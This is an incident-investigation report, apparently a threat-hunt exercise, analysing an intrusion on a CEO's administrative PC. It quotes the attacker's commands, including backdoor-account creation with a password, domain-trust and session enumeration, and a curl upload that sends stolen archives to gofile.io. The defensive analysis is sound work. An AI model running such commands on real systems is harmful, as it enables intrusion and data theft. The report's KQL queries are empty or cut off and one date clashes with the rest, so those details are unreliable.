## Investigation Steps

### 1. Lateral Movement: Source System & Compromised Credentials

Searched for the source of lateral movement to the CEO's administrative PC and discovered consistent connection patterns from source IP address 10.1.0.204. The attacker established multiple RemoteInteractive sessions to azuki-adminpc during early morning hours (4-6 AM) on November 25, 2005. The clustering of connections during early morning hours indicates deliberate off-hours operational security to avoid detection. In addition, the investigation revealed that the yuki.tanaka account was compromised and subsequently reused for lateral movement to the CEO's administrative workstation. This account likely provided the attacker with elevated privileges and access to sensitive business systems. The investigation also confirmed that lateral movement from source IP 10.1.0.204 targeted azuki-adminpc, the CEO's administrative workstation.

---

### 5. Persistence: C2 Implant 

Searched for evidence of command and control implants used by attackers to maintain persistent access and enable remote control of compromised systems. The investigation revealed the extraction of the C2 beacon meterpreter.exe from the archive. Meterpreter is the famous payload/beacon from the Metasploit Framework, one of the most well-known offensive security/penetration testing tools. Meterpreter (short for "Meta-Interpreter") is a sophisticated C2 implant that runs in memory, provides interactive remote access, has extensive post-exploitation capabilities, and is commonly used by APT groups who repurpose legitimate pentesting tools.

---

### 6. Persistence: Named Pipe 

Searched for evidence of named pipe event actions typically used to provide stealthy interprocess communication channels for malware. The named pipe "\Device\NamedPipe\msf-pipe-5902" was created by meterpreter.exe 3 minutes after meterpreter.exe was extracted from the archive (4:21:33 AM extraction → 4:24:35 AM pipe creation) using the Metasploit Framework naming convention (msf-pipe-*).

**Query used to locate events:**

```kql

---

### 7. Credential Access: Decoded Account Creation, Backdoor Account, & Decoded Privilege Escalation Command

Searched for evidence of encoded payloads and discovered two Base64-encoded PowerShell commands. The decoded account creation command was the following: net user yuki.tanaka2 B@ckd00r2024! /add. The decoded privilege escalation command was the following: net localgroup Administrators yuki.tanaka2 /add. Therefore, the attacker created a backdoor account yuki.tanaka2 (similar to the compromised user yuki.tanaka) with administrator privileges using Base64 obfuscation to evade detection.

---

### 8. Discovery: Session Enumeration 

Searched for evidence of terminal services enumeration and discovered that the command qwinsta was executed in order to enumerate RDP sessions, session IDs, session states, and logged-in users to identify active administrators and avoid detection. The attacker used this at 4:08 AM (before creating the backdoor account at 4:51 AM), likely to identify active administrators and see who was logged into the CEO's machine.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))

---

### 9. Discovery: Domain Trust Enumeration

Searched for evidence of domain trust enumeration and discovered that the attacker utilized the following command to enumerate all trust relationships in order to map lateral movement opportunities across domain boundaries: "nltest.exe" /domain_trusts /all_trusts. It's important to note that "nltest.exe" is a native Windows domain trust utility, "/domain_trusts" lists domain trust relationships, and "/all_trusts" shows all trust types (i.e., direct, forest, external, not just direct trusts). This allows the attacker to map out trust relationships between domains, potential lateral movement paths, and connected forests and external domains.

---

### 18. Exfiltration: Data Upload & Cloud Storage Service

Searched for evidence of data exfiltration and discovered the HTTP POST command used to upload stolen data archives to cloud storage. The attacker executed the following curl with form-based POST upload command to exfiltrate the first archive (credentials.tar.gz) to gofile.io: "curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile. This command pattern was repeated for all the other archives. The exfiltration service domain (i.e., gofile.io), is an anonymous cloud storage service that provides temporary file hosting with self-destructing links. It is commonly used for malware distribution and data exfiltration due to no registration requirement and high-speed transfers.

---

## Summary

The investigation revealed a sophisticated post-compromise operation targeting the CEO's administrative workstation. The attacker returned five days after the initial November 19-20, 2025 file server breach, conducting lateral movement from the previously compromised system at 10.1.0.204 to azuki-adminpc using the compromised yuki.tanaka account credentials. The operation demonstrated advanced tactics consistent with ADE SPIDER (APT-SL44, SilentLynx) including infrastructure rotation (litter.catbox.moe for payload delivery), masqueraded payload (payload disguised as Windows update KB5044273-x64.7z), and sophisticated command-and-control deployment using Meterpreter with named pipe msf-pipe-5902.

The attacker established redundant persistence through creation of backdoor account yuki.tanaka2 with Administrator privileges, ensuring continued access even if primary credentials were reset. Comprehensive discovery activities included RDP session enumeration (qwinsta), domain trust mapping (nltest /domain_trusts /all_trusts), and network connection enumeration (netstat -ano), demonstrating systematic environmental reconnaissance.

Credential theft operations targeted multiple high-value sources: KeePass password database Passwords.kdbx with plaintext master password in KeePass-Master-Password.txt, Chrome browser credentials via Mimikatz DPAPI extraction, and systematic collection of financial documents using Robocopy with retry logic and network optimization. Eight distinct archives were created in the hidden staging directory C:\ProgramData\Microsoft\Crypto\staging, masquerading as legitimate Windows cryptographic services.

Exfiltration operations transferred the archives to gofile.io cloud storage (45.112.123.227) using curl with form-based POST uploads. The comprehensive nature of this exfiltration indicates intent to maintain long-term access to organizational credentials and sensitive business intelligence.

The sophistication of this attack, including multiple persistence mechanisms, renamed tool usage (m.exe for Mimikatz), masqueraded staging directories, and systematic multi-target collection, is consistent with ADE SPIDER's known tactics, techniques, and procedures. The targeting of a logistics company CEO in East Asia aligns with the group's established operational patterns and financial motivation.
